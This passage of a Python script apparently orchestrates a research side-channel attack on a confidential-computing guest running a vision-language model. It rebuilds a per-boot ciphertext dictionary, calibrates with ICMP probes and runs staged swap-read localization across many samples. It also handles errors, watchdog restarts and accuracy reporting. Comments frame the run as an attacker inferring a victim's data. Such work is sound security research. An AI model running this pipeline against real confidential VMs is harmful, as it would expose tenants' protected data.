            # the calibration above is (ICMP plants need an idle guest).
            # Per-sample Stage 1 never rebuilds -- that would cost ~4 min per
            # sample instead of ~4 min per boot.
            # ---------------------------------------------------------------
            if args.build_dict:
                print("[orchestrator] Rebuilding ciphertext dictionary for this boot "
                      "(~4 min; VEK is per-launch so an older dictionary cannot match)...")
                t_dict = time.time()
                run_stage1(build_dict=True, skip_existing=False, output_dir=out_dir)
                print(f"[orchestrator] Dictionary rebuilt in {time.time() - t_dict:.0f}s")
            elif to_st >= 5:
                print("[orchestrator] WARNING: Stage 5 will run against the EXISTING "
                      f"dictionary ({c.DICT_CACHE}). If it was not built in THIS boot, "
                      "every match is a false positive. Pass --build-dict.",
                      file=sys.stderr)

            # ---------------------------------------------------------------
            # Step B: bring up the persistent guest VLM loop. The write tracker
            # is NOT started here — it is armed per-sample around each inference
            # (see _start_tracker / _stop_tracker in run_pipeline_for_sample) so
            # it never runs concurrently with the Stage 3 swap-reads.
            # ---------------------------------------------------------------
            guest_loop = GuestStdinLoop(max_new_tokens=args.max_new_tokens)
            guest_loop.start()
        except Exception as e:
            print(f"[orchestrator] Online environment setup note: {e}", file=sys.stderr)

    # Fail fast: if online calibration was required but did not produce a valid
    # Image-Pad reference, do NOT limp through the batch localizing nothing and
    # silently writing 0 real results — abort loudly so the failure is visible.
    if from_st <= 3 and (fixed_gpa is None or ip_ref is None or ip_mask is None):
        print("[orchestrator] FATAL: ICMP calibration failed — no FIXED_GPA / Image-Pad "
              "reference. Stage 3 localization cannot run. Aborting before the batch.\n"
              "  Check: guest reachable, guest_large_icmp_monitor loaded, MTU 9000, "
              "and that the frag probes log to /proc/large_icmp_last.", file=sys.stderr)
        if tracker_proc:
            tracker_proc.terminate()
        if guest_loop:
            guest_loop.close()
        if tracker_log_file:
            tracker_log_file.close()
        sys.exit(1)

    rows: List[Dict[str, Any]] = []
    t_batch_start = time.time()

    MAX_CONSECUTIVE_ERRORS = 3
    consecutive_errors = 0
    aborted = False

    try:
        sample_loop_count = 0
        for idx in indices:
            sample_loop_count += 1
            if guest_loop and sample_loop_count > 1 and sample_loop_count % 40 == 0:
                print(f"[orchestrator] Periodic VLM worker recycle at sample {sample_loop_count} (keeping memory clean & linear)...")
                guest_loop.close()
                guest_loop.start()
                known_blocks.clear()
                # In blind mode the anchor is NOT reset here: the attacker does
                # not get told that the victim restarted, so using this harness
                # event would be an oracle. The miss-streak reset handles it.
                if not args.blind:
                    recency_list.clear()

            # A single failed swap-read (PSP hiccup, guest wedge) must not kill a
            # 1,641-sample batch. Isolate it: the sample writes no
            # stage3_located_*.json, so resume retries it later. But if failures
            # are CONSECUTIVE the guest itself is gone and continuing would burn
            # through the remaining indices marking them all failed -- so bail out
            # with a non-zero exit and let the watchdog do a full guest recovery.
            try:
                row = run_pipeline_for_sample(
                    index=idx,
                    from_stage=from_st,
                    to_stage=to_st,
                    pacer=pacer,
                    guest_loop=guest_loop,
                    fixed_gpa=fixed_gpa,
                    ip_ref=ip_ref,
                    ip_mask=ip_mask,
                    known_blocks=known_blocks,
                    recency_list=recency_list,
                    dict_cache=dict_cache,
                    output_dir=out_dir,
                    blind=args.blind,
                    loc_state=loc_state,
                )
                consecutive_errors = 0
            except KeyboardInterrupt:
                raise
            except Exception as e:
                consecutive_errors += 1
                print(f"  [!] Sample {idx} raised {type(e).__name__}: {e} "
                      f"(consecutive={consecutive_errors}/{MAX_CONSECUTIVE_ERRORS})",
                      file=sys.stderr)
                traceback.print_exc()
                row = {"index": idx, "verdict": "SAMPLE_ERROR", "error": str(e)}
                rows.append(row)
                c.update_summary_csv(summary_csv, row)
                if consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
                    print(f"[orchestrator] {consecutive_errors} consecutive sample failures — "
                          f"guest is likely down. Aborting batch for watchdog recovery.",
                          file=sys.stderr)
                    aborted = True
                    break
                continue

            rows.append(row)
            # Incremental update: append / update this sample in pipeline_summary.csv immediately!
            c.update_summary_csv(summary_csv, row)
    finally:
        if guest_loop:
            guest_loop.close()
        if tracker_proc:
            tracker_proc.terminate()
            try:
                tracker_proc.wait(timeout=5)
            except Exception:
                tracker_proc.kill()
        if tracker_log_file:
            tracker_log_file.close()

    # Load complete accumulated table for overall reporting
    all_accumulated_rows = list(c.load_summary_csv(summary_csv).values())

    # Aggregated Metrics Reporting (Current Run vs Overall Accumulated)
    total_samples = len(rows)
    total_time = time.time() - t_batch_start
    loc_success = sum(1 for r in rows if r.get("loc_match") in (True, "True"))
    top1_pass = sum(1 for r in rows if r.get("top1_match") in (True, "True"))
    any_pass = sum(1 for r in rows if r.get("any_match") in (True, "True"))
    multi_matches = sum(1 for r in rows if r.get("verdict") == "MULTI_MATCH")
    total_fp = sum(int(r.get("false_positive_count", 0)) for r in rows)
    avg_fp = (total_fp / total_samples) if total_samples > 0 else 0.0

    print("\n" + "=" * 75)
    print("  ORCHESTRATION RUN SUMMARY (THIS RUN)")
    print("=" * 75)
    print(f"  Samples Processed in Run  : {total_samples}")
    print(f"  Batch Run Time            : {total_time:.1f}s (Avg: {total_time / max(total_samples, 1):.1f}s/sample)")
    print(f"  Total Swaps in Run        : {pacer.n}")
    print(f"  Base Localization Accuracy: {loc_success}/{total_samples} ({loc_success / max(total_samples, 1) * 100:.1f}%)")
    print(f"  Top-1 Exact Label Accuracy: {top1_pass}/{total_samples} ({top1_pass / max(total_samples, 1) * 100:.1f}%)")
    print(f"  Any-Label Recall          : {any_pass}/{total_samples} ({any_pass / max(total_samples, 1) * 100:.1f}%)")
    print(f"  Multi-Match Rate          : {multi_matches}/{total_samples} ({multi_matches / max(total_samples, 1) * 100:.1f}%)")
    print(f"  Average False Positives   : {avg_fp:.2f} per sample")
    print(f"  Accumulated Total in CSV  : {len(all_accumulated_rows)} samples saved -> {summary_csv}")
    print("=" * 75 + "\n")

    if aborted:
        # Non-zero exit tells auto_watchdog.py to tear down and relaunch the
        # guest before resuming, instead of treating this as a clean finish.
        sys.exit(2)


if __name__ == "__main__":
    main()
